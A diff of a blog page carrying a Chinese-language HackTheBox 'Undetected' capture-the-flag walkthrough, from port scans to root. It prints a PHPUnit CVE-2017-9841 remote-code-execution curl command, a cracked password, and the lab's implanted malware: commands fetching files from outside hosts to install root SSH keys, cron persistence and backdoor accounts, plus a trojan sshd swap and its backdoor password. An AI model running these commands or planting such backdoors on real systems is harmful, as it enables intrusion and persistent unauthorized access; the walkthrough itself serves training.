@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;439 10.10.11.146                                                                                                              端口扫描22和80: 123456789">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;439 10.10.11.146   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV 10.10.11.146Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-24 14:08 CSTN">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Undetected - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/02/24/Undetected-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;439 10.10.11.146                                                                                                              端口扫描22和80: 123456789">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;439 10.10.11.146   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV 10.10.11.146Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-24 14:08 CSTN">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022022401.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022022402.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022022403.jpg">
@@ -129,8 +129,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -152,7 +159,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -219,57 +226,22 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/439" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/439</a></li>
 <li>10.10.11.146</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022401.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022401.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.146</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 14:08 CST</span><br><span class="line">Nmap scan report for 10.10.11.146</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)</span><br><span class="line">|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)</span><br><span class="line">|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Diana's Jewelry</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.84 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>在线商城，store是另一个子域名：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022402.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022402.jpg" alt=""></p>
 <h2 id="store-djewelry-htb"><a href="#store-djewelry-htb" class="headerlink" title="store.djewelry.htb"></a>store.djewelry.htb</h2><p>加hosts后访问：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022403.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022403.jpg" alt=""></p>
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>store注册登录功能现在不能使用，进行目录扫描,发现vendor目录可直接访问：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://store.djewelry.htb/ -x php,html,txt</span><br><span class="line"></span><br><span class="line">/cart.php             (Status: 200) [Size: 4396]</span><br><span class="line">/css                  (Status: 301) [Size: 322] [--&gt; http://store.djewelry.htb/css/] </span><br><span class="line">/error404.html        (Status: 200) [Size: 3974]</span><br><span class="line">/fonts                (Status: 301) [Size: 324] [--&gt; http://store.djewelry.htb/fonts/]</span><br><span class="line">/images               (Status: 301) [Size: 325] [--&gt; http://store.djewelry.htb/images/]</span><br><span class="line">/index.php            (Status: 200) [Size: 6215]</span><br><span class="line">/js                   (Status: 301) [Size: 321] [--&gt; http://store.djewelry.htb/js/]</span><br><span class="line">/login.php            (Status: 200) [Size: 4129]</span><br><span class="line">/products.php         (Status: 200) [Size: 7447]</span><br><span class="line">/vendor               (Status: 301) [Size: 325] [--&gt; http://store.djewelry.htb/vendor/]</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022404.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022404.jpg" alt=""></p>
 <h1 id="PHPUnit"><a href="#PHPUnit" class="headerlink" title="PHPUnit"></a>PHPUnit</h1><p>发现5.6版本的phpunit：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022405.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022405.jpg" alt=""></p>
 <p>可以搜到相关漏洞：</p>
 <ul>
 <li>CVE-2017-9841: What is it, and how do we protect our customers? - OVHcloud Blog<br><a href="https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/" target="_blank" rel="noopener">https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/</a></li>
@@ -277,138 +249,40 @@
 <h2 id="CVE-2017-9841"><a href="#CVE-2017-9841" class="headerlink" title="CVE-2017-9841"></a>CVE-2017-9841</h2><p>利用漏洞执行命令，获取shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST --data '&lt;?php system("id"); ?&gt;' http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022406.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022407.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022406.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022407.jpg" alt=""></p>
 <h1 id="var-backups-info"><a href="#var-backups-info" class="headerlink" title="/var/backups/info"></a>/var/backups/info</h1><p>简单的枚举可以发现一个info文件，下载下来分析：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022408.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022408.jpg" alt=""></p>
 <p>可以在info中发现一串编码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022409.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022410.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022409.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022410.jpg" alt=""></p>
 <h2 id="hash-crack"><a href="#hash-crack" class="headerlink" title="hash crack"></a>hash crack</h2><p>根据解码出来的内容，可以知道是对非root用户，用户名后加1，使用指定密码hash，破解这个hash,得到复制的普通用户的密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">ihatehackers</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022411.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022412.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022411.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022412.jpg" alt=""></p>
 <h2 id="info-command"><a href="#info-command" class="headerlink" title="info command"></a>info command</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" &gt;&gt; /etc/crontab; awk -F":" '$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 &#123;system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow")&#125;' /etc/passwd; awk -F":" '$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 &#123;system("echo "$1" "$3" "$6" "$7" &gt; users.txt")&#125;' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt;</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>根据/etc/passwd中的结果，有steven和steven1两个普通用户，得到的密码可以登录steven1:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022413.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022413.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>/var/mail/steven里有一封邮件提到apache可疑行为：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022414.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022414.jpg" alt=""></p>
 <h2 id="mod-reader-so"><a href="#mod-reader-so" class="headerlink" title="mod_reader.so"></a>mod_reader.so</h2><p>查看apache模块可以发现一个时间与其他模块明显差异比较大的mod_reader.so：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022415.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022415.jpg" alt=""></p>
 <p>下载下来分析，可以发现hook_post_config中一串base64:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022416.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022416.jpg" alt=""></p>
 <p>解码可以发现是替换sshd后门：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd</span><br></pre></td></tr></table></figure>
 
 <h2 id="sshd"><a href="#sshd" class="headerlink" title="sshd"></a>sshd</h2><p>后门sshd也下载下来分析,其中auth_password函数得到后门密码验证过程：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022417.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022417.jpg" alt=""></p>
 <p>这里有点问题，我本地ghidra出来的backdoor结果有两部分是错误的，正确的放在后面了</p>
 <p>然后就是按顺序排列，hex 进行异或，得到后门密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022418.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022418.jpg" alt=""></p>
 <h2 id="Password"><a href="#Password" class="headerlink" title="Password"></a>Password</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xa5</span><br><span class="line">0xa9f4</span><br><span class="line">0xbcf0b5e3</span><br><span class="line">0xb2d6f4a0fda0b3d6</span><br><span class="line">0xfdb3d6e7</span><br><span class="line">0xf7bbfdc8</span><br><span class="line">0xa4b3a3f3</span><br><span class="line">0xf0e7abd6</span><br><span class="line"></span><br><span class="line">@&#x3D;qfe5%2^k-aq@%k@%6k6b@$u#f*b?3</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>使用后门密码登录，得到root：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022419.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022022419.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$xxydXHZzlPY4U0lU$qJDDFjfkXQnhUcESjCaoCWjMT9gAPnyCLJ8U5l2KSlOO3hPMUVxAOUZwvcm87Vkz0Vyc.&#x2F;cDsb2nNZT0dYIbv.:19031:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
@@ -425,7 +299,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2022-07-04T01:26:49.821Z" itemprop="dateUpdated">2022-07-04 09:26:49</time>
+    Last updated: <time datetime="2022-07-04T01:26:49.821Z" itemprop="dateUpdated">2022-07-04 09:26:49</time>
 </span><br>
 
 
@@ -592,11 +466,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
